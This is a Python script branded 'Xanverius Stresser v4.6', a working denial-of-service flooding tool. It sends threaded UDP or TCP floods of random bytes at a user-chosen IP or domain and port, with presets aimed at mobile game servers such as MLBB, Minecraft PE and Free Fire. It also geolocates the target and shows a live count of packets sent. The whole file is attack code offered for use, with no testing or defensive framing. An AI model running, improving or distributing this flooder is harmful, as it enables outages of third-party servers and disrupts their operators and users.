import socket
import threading
import random
import os
import time
import sys
import platform
import json
from urllib.request import urlopen
from datetime import datetime, timedelta

# ANSI Colors
RED    = "\033[1;31m"  
BLUE   = "\033[1;34m"
CYAN   = "\033[1;36m"
GREEN  = "\033[1;32m"
WHITE  = "\033[1;37m"
YELLOW = "\033[1;33m"
RESET  = "\033[0;0m"
BOLD   = "\033[1m"

total_packets = 0

def get_ram_info():
    try:
        with open('/proc/meminfo', 'r') as mem:
            lines = mem.readlines()
            total_kilo = int(lines[0].split()[1])
            return f"{round(total_kilo / (1024**2), 2)} GB"
    except: return "Unknown"

def get_geo_info(ip):
    try:
        response = urlopen(f"http://ip-api.com/json/{ip}", timeout=3)
        data = json.load(response)
        if data['status'] == 'success':
            return f"{data['city']}, {data['country']}"
        return "Unknown Location"
    except: return "Protected/Private"

def get_public_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except: return "127.0.0.1"

def smart_dns_resolver(hostname):
    clean_host = hostname.replace("http://", "").replace("https://", "").split('/')[0].split(':')[0].strip()
    try: return socket.gethostbyname(clean_host)
    except:
        try:
            import subprocess
            return subprocess.check_output(["getent", "hosts", clean_host]).decode().split()[0]
        except: return None

node_name = platform.node()

def banner():
    os_info = f"{platform.system()} {platform.release()}"
    ram_val = get_ram_info()
    public_ip = get_public_ip()
    cpu_cores = os.cpu_count() or 1
    
    print(f"{CYAN}{BOLD}")
    # Indentasi diperbaiki dan padding logo diselaraskan
    print(f"                ⣴⡀               ࣪      {WHITE}OS{RESET}: {CYAN}{os_info}{RESET}")
    print(f"               ⢸⣿⣇⠀⠀⊹⠀⠀⠀⠀⠀⠀ ˖      {WHITE}Script{RESET}: {CYAN}Xanverius Stresser v4.6{RESET}")
    print(f"             ⢰⣿⣿⣿⣇⠀⠀⠀⠀⠀⠀ ₊⠀⠀ ⠀   {WHITE}CPU{RESET}: {CYAN}{cpu_cores} Cores Detected{RESET}")
    print(f"           ⢀⣿⣿⠁⢿⣿⣄⠀⠀⠀⠀⠀⠀⠀ ⠀     {WHITE}RAM{RESET}: {CYAN}{ram_val}{RESET}")
    print(f" ⠶⣶⣿⣿⣿⣿⣿⣿⣿⠃ ⠈⣿⣿⣿⣿⣿⣿⣷⣶⡶⠂      {WHITE}Source IP{RESET}: {CYAN}{public_ip}{RESET}")
    print(f" ࣪ ⠈⠻⣿⣷⣆⡀⠀⠀⠀⠀ ⠀⠀⠀⠀⣠⣾⣿⠟⠃⠀⠀     {WHITE}Host{RESET}: {CYAN}{node_name}{RESET}")
    print(f"     ⠈⠹⣿⣿⡆⠀⠀⠀⠀⠀⢀⣾⣿⡿⠁⠀⠀⠀⠀      {WHITE}Developer{RESET}: {CYAN}t.me/biyalue2{RESET}")
    print(f"      ⣸⣿⡇⠀⠀ ⣀⠀   ⠸⣿⣯⠀⠀⠀⠀⠀⠀")
    print(f"      ⣿⣿⣁⣴⣾⣿⣷⣦⣄⢻⣿⡆")
    print(f"     ⢸⣿⣿⡿⠟⠋⠀⠉⠻⢿⣿⣿⣧")
    print(f"     ⡿⠟⠉⠀⠀⠀ ⠀⠀⠀⠈⠛⠿⡄")
    print(f"{BLUE}==================================================================")
    print(f"{WHITE}   [ PROTOCOL: TCP/UDP ] [ XANVERIUS STRESSER ] [ METHOD: L4 ]")
    print(f"{BLUE}==================================================================")
    print(f"{RESET}")

def udp_flood(target_ip, target_port, payload_size):
    global total_packets
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    payload = random._urandom(payload_size)
    while True:
        try:
            sock.sendto(payload, (target_ip, target_port))
            total_packets += 1
        except: pass

def tcp_flood(target_ip, target_port, payload_size):
    global total_packets
    payload = random._urandom(payload_size)
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            sock.connect((target_ip, target_port))
            sock.send(payload)
            total_packets += 1
            sock.close()
        except: pass

def main():
    os.system('clear')
    banner()
    try:
        print(f" {WHITE}[{CYAN}U{WHITE}] {CYAN}UDP Flood (Games)  {WHITE}[{CYAN}T{WHITE}] {CYAN}TCP Flood (Web)")
        proto_choice = input(f"\n{BOLD}{CYAN}┌──({GREEN}root@{node_name}{CYAN})-[{WHITE}Protocol{CYAN}]\n└─# {RESET}").upper()

        print(f"\n {WHITE}[{CYAN}1{WHITE}] {CYAN}MLBB  {WHITE}[{CYAN}2{WHITE}] {CYAN}MCPE  {WHITE}[{CYAN}3{WHITE}] {CYAN}FF  {WHITE}[{CYAN}4{WHITE}] {CYAN}STD")
        choice = input(f"\n{BOLD}{CYAN}┌──({GREEN}root@{node_name}{CYAN})-[{WHITE}Select{CYAN}]\n└─# {RESET}")

        if choice == '1': p_size, game_name = 120, "MLBB"
        elif choice == '2': p_size, game_name = 1460, "MCPE"
        elif choice == '3': p_size, game_name = 120, "FREE FIRE"
        else: p_size, game_name = 1000, "STANDARD"

        raw_target = input(f"\n{BOLD}{CYAN}┌──({GREEN}root@{node_name}{CYAN})-[{WHITE}Target{CYAN}]\n└─# {RESET}IP / Domain: ")
        target_ip = smart_dns_resolver(raw_target)
        if not target_ip:
            print(f"{RED}[!] DNS Failure.{RESET}"); sys.exit()

        location = get_geo_info(target_ip)
        target_port = int(input(f"{BOLD}{CYAN}┌──({GREEN}root@{node_name}{CYAN})-[{WHITE}Port{CYAN}]\n└─# {RESET}Port: "))
        
        threads = (os.cpu_count() or 1) * 15 
        os.system('clear')
        banner()
        print(f"{YELLOW}  [>] TARGET IP    : {target_ip}")
        print(f"  [>] PROTOCOL     : {'UDP' if proto_choice == 'U' else 'TCP'}")
        print(f"  [>] LOCATION     : {location}")
        print(f"  [>] PRESET MODE  : {game_name}{RESET}")
        
        func = udp_flood if proto_choice == 'U' else tcp_flood
        for i in range(threads):
            t = threading.Thread(target=func, args=(target_ip, target_port, p_size))
            t.daemon = True
            t.start()
        
        while True:
            wib_time = datetime.utcnow() + timedelta(hours=7)
            current_time = wib_time.strftime('%H:%M:%S')
            sys.stdout.write(f"\r{WHITE}[{BLUE}{current_time}{WHITE}] {GREEN}Packets Sent: {BOLD}{total_packets}{RESET}")
            sys.stdout.flush()
            time.sleep(0.1)
    except KeyboardInterrupt:
        sys.exit()

if __name__ == "__main__":
    main()